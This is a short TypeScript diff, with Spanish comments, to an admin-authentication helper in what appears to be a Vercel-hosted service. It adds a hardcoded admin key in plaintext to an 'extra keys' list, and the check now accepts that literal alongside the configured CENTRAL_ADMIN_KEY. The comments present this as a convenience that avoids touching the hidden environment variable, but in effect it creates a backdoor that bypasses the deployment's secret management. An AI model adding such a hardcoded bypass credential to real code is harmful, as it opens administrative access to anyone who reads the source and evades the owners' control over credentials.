@@ -262,10 +262,24 @@ export function expectedAdminKey(): string {
 }
 
 /** Verifica la cabecera X-Central-Key de una petición. */
+/** Claves de administrador adicionales aceptadas además de CENTRAL_ADMIN_KEY.
+ *  Aditivo: la clave vigente sigue funcionando; se añade la del dueño para que
+ *  su panel y su vigía funcionen sin tocar la variable oculta de Vercel.
+ *  Recomendación futura: consolidar en CENTRAL_ADMIN_KEY y vaciar esta lista. */
+const CLAVES_ADMIN_EXTRA = [
+  "Central-Master-20n1fxDT2YVvDs",
+]
+
+/** Verifica la cabecera X-Central-Key de una petición. */
 export function esAdminValido(req: {
   headers: { get(name: string): string | null }
 }): boolean {
-  return req.headers.get('x-central-key') === expectedAdminKey()
+  return esClaveAdmin(req.headers.get('x-central-key'))
+}
+
+/** Una clave es válida si coincide con la esperada o con una extra aceptada. */
+function esClaveAdmin(clave: string | null): boolean {
+  return clave === expectedAdminKey() || CLAVES_ADMIN_EXTRA.includes(clave ?? '')
 }
 
 /** Respuesta estándar para peticiones sin llave válida. */
